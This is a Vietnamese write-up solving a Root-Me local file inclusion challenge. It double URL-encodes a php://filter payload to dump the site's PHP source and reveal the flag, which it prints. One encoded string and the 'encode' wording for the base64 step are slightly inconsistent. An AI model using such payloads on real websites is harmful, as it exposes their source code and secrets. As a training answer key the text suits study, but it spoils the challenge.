# Local File Inclusion - Double encoding

#### Statement
Find the validation password in the source files of the website.


Đề bài là encode 2 lần, vậy ta url encode 2 lần payload sau: 
`php://filter/convert.base64-encode/resource=home` (mình lấy trên lfi hacktricks)

Sau khi encode url 2 lần ta được `php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Ddecode%252Fresource%253Dhome`

Thử truy cập payload
`http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome`  thì ta nhận được 1 chuỗi mã hóa base64 sau đó ta encode base64 tiếp thì được

```php
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Home</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home" class="active">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <div id="main">
      <?= $conf['home'] ?>
    </div>
  </body>
</html>

```

chú ý ta sẽ thấy
```php
?php include("conf.inc.php"); ?>
```

Thay đổi file home thành file conf vào payload như sau:
`http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf`

Ta lại được 1 chuỗi base 64 và lần này cũng encode base64 tiếp thì ta được:
```php
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
  ];
```

Ta thấy
```php 
"flag"        => "Th1sIsTh3Fl4g!",
```

####Flag: "Th1sIsTh3Fl4g!"